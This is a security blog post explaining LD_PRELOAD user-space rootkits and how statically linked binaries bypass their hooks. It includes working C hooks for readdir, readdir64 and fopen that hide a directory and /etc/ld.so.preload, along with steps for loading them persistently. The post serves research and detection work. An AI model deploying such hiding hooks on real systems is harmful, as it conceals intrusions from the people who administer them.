---
title: "Bypassing LD_PRELOAD Rootkits Is Easy"
date: 2025-05-14T19:42:06-04:00
draft: true
---

## Introduction

In this post, I'm going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.

##  LD_PRELOAD

`LD_PRELOAD` is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.

This technique allows you to "hook" functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.

When an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().

Example:

```bash
LD_PRELOAD=./rootkitresearchers.so ls
```

> /etc/ld.so.preload  

Besides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.

## Installing and Hiding Directory with Rootkit

To demonstrate this, I'll use a simple LD_PRELOAD rootkit that hooks the `readdir`, `readdir64`, and `fopen` functions to change the behavior of file and directory listings. The  code is shown below.

[Full source](https://github.com/MatheuZSecurity/Rootkit/blob/main/Ring3/hiding-directory/hide.c)

```c
struct dirent *(*orig_readdir)(DIR *dirp);
struct dirent *readdir(DIR *dirp)
{
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDDEN_DIR) != 0 && strcmp(entry->d_name, HIDDEN_FILE) != 0) {
            return entry;
        }
    }
    return NULL;
}
```

This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, "readdir"). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to "secret" or "ld.so.preload". Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.

```c
struct dirent64 *(*orig_readdir64)(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp)
{
    if (!orig_readdir64)
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDDEN_DIR) != 0 && strcmp(entry->d_name, HIDDEN_FILE) != 0) {
            return entry;
        }
    }
    return NULL;
}
```

This is the same logic but for the 64-bit version readdir64.

```c
FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen)
        orig_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(pathname, HIDDEN_FILE) != NULL) {
        errno = ENOENT;
        return NULL;
    }

    return orig_fopen(pathname, mode);
}
```

This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.

Now let's compile and load it into `/etc/ld.so.preload`

![imgur](https://i.imgur.com/9Id2UUt.png)

Once loaded, we can test creating a directory named `secret`, and see if it is hidden from ls.

![imgur](https://i.imgur.com/NAUR8Nl.png)

![imgur](https://i.imgur.com/inkluye.png)

As expected, it was hidden from ls.

## [Theory] Breaking LD_PRELOAD rootkits

Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to "inject" their malicious libraries before the standard system libraries, such as libc. But does this work with all programs? 

The short and quick answer is: No!

> Why does LD_PRELOAD work, and why does it sometimes not work?

LD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.

But for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.

> Why do static binaries break this idea?

Statically linked binaries are "self-contained". They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.

In other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.

This is one of the most effective ways to bypass these rootkits.

## [Practice] Breaking LD_PRELOAD rootkits

With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader. 

But it is easy to bypass this, for example: just compile a static binary, like a simple [getdents64.c](https://raw.githubusercontent.com/finallyjustice/sample/refs/heads/master/c/getdents64.c)

> gcc getdents64.c -o getdents64 --static

When using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.

![imgur](https://i.imgur.com/fv0N05S.png)

Bypassing LD_PRELOAD rootkits is simply very easy.

## Conclusion

LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.

If you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!

> Rootkit Researchers

> https://discord.gg/66N5ZQppU7